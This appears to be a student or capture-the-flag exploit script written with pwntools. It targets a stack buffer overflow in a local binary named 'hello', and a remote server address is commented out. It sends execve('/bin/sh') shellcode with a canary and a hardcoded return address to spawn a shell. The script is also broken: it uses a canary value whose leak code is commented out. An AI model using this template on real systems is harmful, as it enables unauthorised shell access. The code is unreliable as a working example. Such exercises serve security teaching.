#!/usr/bin/python3
from pwn import *
import struct

# connect with the server
# r = remote('140.113.24.241', 30174)
r = process('./hello')
# r = gdb.debug("./hello", "break main")
# r.interactive()
# receive output message from the server
r.sendlineafter('Input your choice:\n', b'1')
print(r.recvline())

# get the buffer address and drop '\n' at the end
r.send(b'11111111222222223333333344444444555555556666666677777777888888889999999900000000aaaaaaaa')
print(r.recvline())
r.interactive()
# r.recvuntil(b'1111111111222222222233333333334444444444')
# canary = u64(r.recv(7).rjust(8, b'\x00'))
# print("canary: ", hex(canary))

# shellcode to call: execve("/bin/sh")
# reference: http://shell-storm.org/shellcode/files/shellcode-603.php
shellcode = b"\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"

# pack the buffer address into bytes in little-endian order
# this will overwrite the return address
addr = 0x7ffe004c3e00
ret_addr = struct.pack('<Q', addr)

# you can fill the rest of stack memory with anything
# filler = b'A' * (40 - len(shellcode))
# payload = shellcode + filler + ret_addr
payload = shellcode + p64(canary) + b'A' * 8 + ret_addr
r.sendline(payload)
r.interactive()
# send our input to the server

# r.sendline(payload)
# r.interactive()
